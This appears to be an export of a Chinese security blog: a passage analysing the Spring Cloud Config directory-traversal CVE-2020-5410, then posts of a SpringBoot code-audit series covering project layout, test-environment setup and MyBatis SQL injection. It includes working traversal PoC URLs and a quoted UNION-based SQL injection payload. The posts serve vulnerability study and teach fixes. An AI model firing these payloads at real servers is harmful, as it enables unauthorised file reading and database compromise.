<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/diff-2.2.2.png" alt="diff-2.2.2"></p>
<p>为了搞明白为什么要多加一个<code>pathUtils.isInvalidEncodedLocation</code>判断，查看<code>Environment.normalize()</code>，发现是将<code>SLACH_PLACEHOLDER</code>替换成<code>/</code>，<code>SLACH_PLACEHOLDER</code>为<code>(_)</code>。看到这里，是不是就想起了在CVE-2020-5405中利用<code>(_)</code>代替<code>/</code>绕过检测的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s != <span class="keyword">null</span> &amp;&amp; s.contains(SLASH_PLACEHOLDER)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		<span class="keyword">return</span> s.replace(SLASH_PLACEHOLDER, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
<p>调试所使用版本为<code>spring-cloud-config-2.2.2.RELEASE</code></p>
<p>和CVE-2020-5405一样需要，更将configserver.yml改成本地配置</p>
</blockquote>
<p>和前面两个漏洞（CVE-2019-3799和CVE-2020-5405）类似，也是拼接了传入的值，而传入的值能够通过URL二次编码和<code>(_)</code>替换绕过路径检测，实现任意文件读取。但触发任意文件读取的函数和入口不一样。</p>
<p>在<code>EnvironmentController.java</code>中找到<code>getEnvironment</code>方法，其中可控的参数为<code>name</code>、<code>profiles</code>和<code>label</code>，调试步进<code>findOne</code>方法</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getEnvironment.png" alt="debug-getEnvironment" style="zoom:45%;">



<p><code>NativeEnvironmentRepository.java</code>中的<code>getArgs</code>中存在对我们可控参数<code>name</code>、<code>profiles</code>和<code>label</code>的处理，步进该方法进行查看。</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-findOne.png" alt="debug-findOne" style="zoom:45%;">



<p>在<code>getArgs()</code>方法中看到熟悉的<code>getLocations()</code>，这里可能存在路径拼接</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getArgs.png" alt="debug-getArgs" style="zoom:45%;">



<p>果然，在<code>getLocations()</code>方法中进行了路径的拼接，将<code>location</code>和<code>label</code>参数拼接在一起</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getLocations.png" alt="debug-getLocations" style="zoom:45%;">



<p>光有<code>location</code>的拼接并不能产生文件读取，还得找到读取文件名的控制。</p>
<p>经过一段时间的调试，最终发现在<code>builder.run</code>中发现整个路径的拼接。</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-builder-run.png" alt="debug-builder-run" style="zoom:45%;">



<p>整个过程调用栈比较长，调试起来比较麻烦，知道这里将<code>search-locations</code>+<code>label</code>+<code>name</code>拼接起来就行（上面代码中447行中的<code>location</code>是<code>search-locations</code>+<code>label</code>的结果）。</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-stack.png" alt="debug-stack" style="zoom:45%;">



<p><code>load</code>方法如下</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-load.png" alt="debug-load" style="zoom:45%;">

<p><code>load</code>方法调用<code>loadForFileExtension</code>方法，在其中发现整个文件路径的拼接</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-loadForFileExtension.png" alt="debug-loadForFileExtension" style="zoom:45%;">



<p>注意拼接后还带上了 <code>&quot;-&quot; + profile + fileExtension</code>，虽然<code>profile</code>和<code>fileExtension</code>都是可控的，但是这个<code>-</code>比较难处理。<code>-</code>的存在会导致绝大部分文件都无法被读取。</p>
<p>注意到修复中将<code>#</code>做了限制，根据<code>#</code>在URL中的特性猜测<code>#</code>会使后面的字符变成标识符，不会被识别。</p>
<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/location-contain-sharp.png" alt="location-contain-sharp" style="zoom:45%;">



<p>构造PoC进行请求后发现果然能用<code>#</code>“注释”后面的内容。</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>PoC：<a href="http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29" target="_blank" rel="noopener">http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</a> </p>
<p><code>test.txt</code>文件中的内容为<code>just for test</code>，可以看到其中存在多处文件信息回显。因为<code>file:/tmp//test.txt#-seikei.xml</code>中<code>#</code>后面的字符不会被解析，等于访问的是<code>file:/tmp//test.txt</code>。</p>
<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc1.png" alt="poc1"></p>
<p>由于整个文件路径是由<code>label</code>和<code>name</code>进行的拼接，所以也可以在<code>name</code>处输入路径回溯符。</p>
<p>测试之后发现同样会返回文件内容。</p>
<p>PoC2：<a href="http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test" target="_blank" rel="noopener">http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test</a> </p>
<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc2.png" alt="poc2"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">

<a id="more"></a>

<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
<p><code>config/</code>: 存放配置文件</p>
<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
<p><code>entity/</code>: 存放实体类</p>
<p><code>interceptor/</code>: 拦截器</p>
<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
<p><code>utils/</code>: 存放工具类</p>
<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
<p>非该项目，但可能存在的文件夹：</p>
<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
<p><code>constant/</code>:  存放常量</p>
<p><code>filter/</code>: 存放过滤器</p>
<p><code>component/</code>: 存放组件</p>
<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
<p><code>templates/</code>: 存放模版文件</p>
<p><code>application.properties</code>: Spring Boot默认配置文件</p>
<p>非该项目，但可能存在的文件：</p>
<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">



<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计一 - 前期准备</title>
    <url>/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/</url>
    <content><![CDATA[<p>本系列文章使用SpringBoot+Mybaits的小型商城作为本次代码审计的目标，项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> </p>
<p>SpringBoot+Mybatis这套架构使用较为广泛，相比于SpringMVC，SpringBoot简化了很多配置，更易上手使用。并且该项目属于小型系统，程序逻辑较为简单，作者编码规范，搭建也非常方便，只需要配置数据库（MySQL）和商品图片资源，SpringBoot自带中间件，无需额外配置中间件，方便调试，代码中没看懂的逻辑，下断点上手调试非常便捷，非常适合新手入门代码审计。</p>
<a id="more"></a>

<h1 id="代码配置"><a href="#代码配置" class="headerlink" title="代码配置"></a>代码配置</h1><p>从项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> 下载代码，在IntelliJ IDEA中导入<code>pom.xml</code>，IDEA会以maven项目打开并自动下载依赖包。</p>
<p>Spring属性文件路径：<code>/src/main/resources/application.properties</code>，其中可修改端口和mysql数据库地址</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8089</span></span><br><span class="line"><span class="attr">...</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/newbee_mall_db?...</span></span><br></pre></td></tr></table></figure>



<p>配置文件路径：<code>/src/main/java/ltd/newbee/mall/config/NeeBeeMallWebMvcConfigurer.java</code>，其中配置了图片路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">	registry.addResourceHandler(<span class="string">"/upload/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">	registry.addResourceHandler(<span class="string">"/goods-img/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>此时是没有测试数据的，需要将<code>/src/main/resources/upload.zip</code>压缩包中的测试商品数据解压出来，放到任意的目录中。此处作为学习测试使用，可以直接解压在当前路径下，正式系统中一定要存放在非项目路径下。</p>
<p>在文件<code>src/main/java/ltd/newbee/mall/common/Constants.java</code>中，变量<code>FILE_UPLOAD_DIC</code>为当前上传图片路径，将其更改为我们解压<code>upload.zip</code>的<strong>绝对</strong>路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Constants</span> </span>&#123;</span><br><span class="line">	<span class="comment">//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String FILE_UPLOAD_DIC = <span class="string">"/some_path/src/main/resources/upload/"</span>;</span><br><span class="line">	<span class="comment">//public final static String FILE_UPLOAD_DIC = "D:\\upload\\";//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="MySQL数据库配置"><a href="#MySQL数据库配置" class="headerlink" title="MySQL数据库配置"></a>MySQL数据库配置</h1><p>过程中使用docker来快速搭建测试所需的数据库，docker方便更改测试过程中使用到的各组件版本，并且测试结束后可删除容器而不对本地环境造成任何影响。</p>
<p>使用其他方法安装mysql数据库也行，记得要在配置文件中更改mysql地址。代码部署在docker内也是可以的，不过考虑调试方便，还是建议直接本地运行代码，有远程调试经验的同学可以尝试将代码一同布置在docker内。</p>
<p>拉取mysql（latest为最新版本，需要其他版本可将lastest改为具体版本号即可）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mysql:latest</span><br></pre></td></tr></table></figure>

<p>运行（因为仅作为测试环境，并且在容器里，所以将mysql密码设置为简单密码，非测试环境慎重）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br></pre></td></tr></table></figure>

<p>进入容器，确定MySQL正常运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it mysql /bin/bash</span><br><span class="line"></span><br><span class="line">root@815203ed6f5a:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: 123456</span><br><span class="line">mysql&gt; select @@version;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-version.png" alt="mysql-version"></p>
<p>另起一个终端，将sql文件复制到容器内（8d3b6661cdd2是容器ID）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp /some_path/newbee-mall/src/main/resources/newbee_mall_schema.sql 815203ed6f5a:/root</span><br></pre></td></tr></table></figure>

<p>回到容器，建立数据库（如果这里更改了数据库名，需要同时修改<code>application.properties</code>中mysql连接的数据库名）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">mysql&gt; create database newbee_mall_db；</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>执行sql文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p newbee_mall_db&lt;/root/newbee_mall_schema.sql</span></span><br></pre></td></tr></table></figure>

<p>进行简单的数据库查询，校验是否成功导入SQL。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use newbee_mall_db;</span><br><span class="line">mysql&gt; select * from tb_newbee_mall_admin_user;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-import-sql.png" alt="mysql-import-sql"></p>
<p>看到能成功查询我们导入的SQL，配置成功～（中文字符没显示出来，被<code>?</code>代替）</p>
<h1 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h1><p>以上步骤完成后，在IntelliJ IDEA中运行项目，访问在<code>application.properties</code>中配置的端口就能看到项目。</p>
<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/run-application.png" alt="run-application"></p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计三 - SQL注入</title>
    <url>/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/</url>
    <content><![CDATA[<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>SQL注入是代审中最容易找的漏洞之一，一般都在固定的模块存放SQL语句，只需在这些SQL语句中搜寻是否拼接参数即可。</p>
<p><a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">案例项目</a>使用Mybatis作为数据持久层框架，进行数据库的各种操作。MyBatis的主要思想是将程序中的大量SQL语句剥离出来，配置在配置文件当中，实现SQL的灵活配置。配置文件常存放在<code>src/main/resources/mapper</code>中，配置文件命名为<code>ExampleMapper.xml</code></p>
<a id="more"></a>

<p>在<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">项目</a>的第一个issue中看到已经有人提出<a href="https://github.com/newbee-ltd/newbee-mall/issues/1" target="_blank" rel="noopener">SQL注入漏洞</a>，并给出poc： <code>http://127.0.0.1:28089/search?goodsCategoryId=&amp;keyword=\%&#39;)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627871,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x7162786b71),NULL,NULL#&amp;orderBy=default</code>   </p>
<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/SQLi-issue.png" alt="SQLi-issue" style="zoom:50%;">

<p>随后作者对该SQL注入点进行修复，<a href="https://github.com/newbee-ltd/newbee-mall/commit/dac570107a67044ac754c9a20cd6ef305ed56b0e#comments" target="_blank" rel="noopener">commit</a>中将<code>like</code>模糊查询处的<code>${keyword}</code>改为<code>#{keyword}</code>。</p>
<img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/fix-sqli-ommit.png" alt="fix-sqli-ommit" style="zoom:40%;">



<h1 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h1><p>为什么将<code>${}</code>改为<code>#{}</code>就能防止SQL注入呢？</p>
<p>MyBatis<a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">官方文档</a>中有如下叙述:</p>
<blockquote>
<p><code>#{}</code>告诉 MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 近似的 JDBC 代码，非 MyBatis 代码...</span></span><br><span class="line">String selectPerson = <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span>;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(selectPerson);</span><br><span class="line">ps.setInt(<span class="number">1</span>,id);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/prepareStatement.png" alt="prepareStatement"></p>
<p><code>${}</code> 仅仅是纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换，类似于直接替换字符串，会导致SQL注入产生。</p>
<p>官方也给出警示：</p>
<blockquote>
<p>用这种方式接受用户的输入，并将其用于语句中的参数是不安全的，会导致潜在的 SQL 注入攻击，<strong>因此要么不允许用户输入这些字段，要么自行转义并检验</strong>。</p>
</blockquote>
<p>开发的原则是能使用<code>#{}</code>的地方，一定使用<code>#{}</code>。但是SQL语句中存在无法使用<code>#{}</code>的场景，因为使用<code>#{}</code>会在原本的字段加上引号<code>&#39;&#39;</code>，导致SQL语句报错。不能使用<code>#{}</code>的场景我们需要特别注意，此处极易产生SQL注入。</p>
<p>不能使用<code>#{}</code>的场景有：</p>
<ol>
<li>表名/字段名</li>
<li>order by/group by</li>
<li>like模糊查询</li>
<li>in</li>
</ol>
<p>以表名为例，使用<code>#{}</code>替换字符串时会带上单引号 <code>&#39;&#39;</code>，这会导致 sql 语法错误，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="comment">#&#123;tableName&#125; where name = #&#123;name&#125;;</span></span><br></pre></td></tr></table></figure>

<p>预编译之后的sql 变为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ? <span class="keyword">where</span> <span class="keyword">name</span> = ?;</span><br></pre></td></tr></table></figure>

<p>假设我们传入的参数为 tableName = “user” , name = “username”，那么在占位符进行变量替换后，sql 语句变为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'user'</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'username'</span>;</span><br></pre></td></tr></table></figure>

<p>上述 sql 语句是存在语法错误的，表名不能加单引号 <code>&#39;&#39;</code>（不过反引号 ``是可以的）。</p>
<p>不过表名一般不会通过用户传入，即使是用户传入，由于Mybatis的查询机制，并不会产生SQL注入。</p>
<p>避免使用<code>${}</code>的方法</p>
<ol>
<li>表名/字段名</li>
</ol>
<p>尽量直接使用表名和字段名，如果有动态查询的需求时，将表名和字段名限定在指定字符。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tableName = tableName.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>order by/group by </li>
</ol>
<p>order by后</p>
<p>修复方法是推荐开发在Java层面做映射，设置一个字段/表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">query.append(<span class="string">" ORDER BY "</span>);    </span><br><span class="line">String[] orderByFields = orderByComparator.getOrderByFields();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; orderByFields.length; i++) &#123;</span><br><span class="line">query.append(<span class="string">"appSetPersonal."</span>);</span><br><span class="line">query.append(orderByFields[i]);</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> &lt; orderByFields.length) &#123;</span><br><span class="line">	<span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">		query.append(<span class="string">" ASC, "</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		query.append(<span class="string">" DESC, "</span>);</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (orderByComparator.isAscending() ^ previous) &#123;</span><br><span class="line">	query.append(<span class="string">" ASC"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	query.append(<span class="string">" DESC"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者将传入的值限定在指定字符，如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">orderByField = orderByField.replaceAll(<span class="string">"[^a-zA-Z0-9+]"</span>, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>like模糊查询</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="keyword">CONCAT</span>(<span class="string">'%'</span>,<span class="comment">#&#123;param&#125;,'%')</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">oracle</span>: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>||<span class="comment">#&#123;param&#125;||'%'</span></span><br><span class="line"></span><br><span class="line">mssql: </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> goods_name <span class="keyword">like</span> <span class="string">'%'</span>+<span class="comment">#&#123;param&#125;+'%'</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>in</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> </span><br><span class="line">&lt;foreach collection=<span class="string">"ids"</span> item=<span class="string">"item"</span> <span class="keyword">open</span>=<span class="string">"("</span> separator=<span class="string">","</span> <span class="keyword">close</span>=<span class="string">")"</span>&gt;</span><br><span class="line"><span class="comment">#&#123;item&#125;</span></span><br><span class="line">&lt;/foreach&gt;</span><br></pre></td></tr></table></figure>



<h1 id="SQL注入代码审计"><a href="#SQL注入代码审计" class="headerlink" title="SQL注入代码审计"></a>SQL注入代码审计</h1><p>知道了SQL注入产生的原理，那么找漏洞就非常简单了。SQL注入是代码审计中最好找的漏洞之一，只需分析SQL语句发现拼接，再逆向追踪拼接参数用户是否可控。不用被代码的多层调用所干扰。</p>
<p>SQL注入审计过程：</p>
<ol>
<li>在Dao层（Mybaits在Mapper中，Mybatis也有注解写SQL的方式，但很少用），查看SQL语句是否使用拼接，关注<code>${}</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select id&#x3D;&quot;getUID&quot; parameterType&#x3D;&quot;string&quot; reusltType&#x3D;&quot;User&quot;&gt;</span><br><span class="line">	select * from user where uid&#x3D;$&#123;uid&#125;</span><br><span class="line">&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>

<p>  其他SQL拼接：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># JDBC中的拼接，关注+：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid='"</span>+ UID +<span class="string">"'"</span>);</span><br><span class="line"># JDBC中的预编译：</span><br><span class="line">sqlString.append(<span class="string">"select * from user where uid= ?"</span>);</span><br><span class="line"></span><br><span class="line"># Hibernate中的拼接：</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = '"</span> + UID + <span class="string">"'"</span>);</span><br><span class="line">List result = session.createQuery(queryString).list();</span><br><span class="line"># Hibernate中的预编译</span><br><span class="line">sql.append(<span class="string">"select * from user where uid = :UID"</span>);</span><br><span class="line">paramters.setString(<span class="string">"UID"</span>, UID);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>若存在拼接参数，则逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为<code>Mapper -&gt; Dao -&gt; ServiceImpl -&gt; Controller</code></li>
</ol>
<p>⚠️ 并不是全部的<code>${}</code>拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的：</p>
<ol>
<li>param不是用户传参进来的</li>
<li>param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入</li>
<li>param在过程中已经转义或过滤字符，但是在Mybaits的SQL语句中看不出来，需考虑是否能绕过</li>
</ol>
<h1 id="参数追踪"><a href="#参数追踪" class="headerlink" title="参数追踪"></a>参数追踪</h1><p>以文章开头的SQL注入为例，来进行<code>keyword</code>参数逆向追踪过程</p>
<p><code>/src/main/resources/mapper/NewBeeMallGoodsMapper.xml:70,94</code>存在<code>${}</code>拼接</p>
<p><img src="/2020/05/01/JavaSpringBootCodeAudit-3-SQL-Injection/sqli-in-like.png" alt="sqli-in-like"></p>
<p>可以看到在like后面使用了concat拼接，这是因为mapper.xml是使用mybatis-generator自动生成的，产生的like语句和in语句默认使用<code>#{}</code>，但这里使用<code>${}</code>拼接字符可能是由于作者修改功能时更改，导致SQL注入漏洞产生。</p>
